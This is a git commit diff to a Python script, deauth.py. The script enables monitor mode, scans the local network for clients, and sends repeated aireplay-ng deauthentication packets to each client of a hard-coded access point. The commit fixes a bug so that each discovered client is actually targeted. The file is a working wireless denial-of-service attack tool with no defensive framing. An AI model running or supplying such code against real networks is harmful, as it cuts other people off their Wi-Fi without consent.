2179c2ccb3e70595524604ccddcc793af1722dad
John Farrell <johnfarrell@128-122-6-152.DYNAPOOL.NYU.EDU>
2015-03-26 21:52:42 -0400

    string fix

--- deauth.py
+++ deauth.py
@@ -12,13 +12,12 @@ def testing():
             make_mon = subprocess.call(['sudo','airmon-ng','start','wlan0','11'])
             scan = subprocess.check_output(['sudo','arp-scan','--localnet','--interface=mon0'])
             tscan = scan.split("\t")
-            print tscan[1::2]
+            targets = tscan[1::2]
             for t in targets:
-                print t
-                #test = subprocess.call(['sudo','aireplay-ng','-0','20','-a','00:3A:98:2B:FD:00','mon0','--ignore-negative-one'])
-                test = subprocess.call(['sudo','aireplay-ng','-0','20','-a','00:3A:98:2B:FD:00','-c','t','mon0','--ignore-negative-one'])
+                test = subprocess.call(['sudo','aireplay-ng','-0','20','-a','00:3A:98:2B:FD:00','-c',str(t),'mon0','--ignore-negative-one'])
     except Exception, e:
             print "Error:", e
+
 
 
 
